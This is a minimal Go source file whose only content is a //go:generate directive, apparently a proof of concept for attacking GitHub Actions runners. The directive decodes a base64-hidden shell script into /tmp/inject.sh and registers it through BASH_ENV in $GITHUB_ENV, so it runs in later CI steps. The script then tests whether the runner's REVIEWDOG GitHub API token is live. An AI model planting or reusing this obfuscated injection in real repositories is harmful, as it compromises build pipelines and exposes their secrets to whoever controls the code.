package main

//go:generate sh -c "echo '=== RCE: go generate executed on base-repo runner ===' && echo IyEvYmluL3NoClNUQVRVUz0kKGN1cmwgLXMgLW8gL2Rldi9udWxsIC13ICcle2h0dHBfY29kZX0nIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFJFVklFV0RPR19HSVRIVUJfQVBJX1RPS0VOIiBodHRwczovL2FwaS5naXRodWIuY29tL3JlcG9zLyRHSVRIVUJfUkVQT1NJVE9SWSkKZWNobyAiVkVSSUZZX1NUQVRVUzogJFNUQVRVUyAoMjAwID0gdG9rZW4gaXMgbGl2ZSBhbmQgaGFzIHJlcG8gYWNjZXNzKSIK | base64 -d > /tmp/inject.sh && chmod +x /tmp/inject.sh && echo BASH_ENV=/tmp/inject.sh >> $GITHUB_ENV && echo '--- BASH_ENV injected ---'"
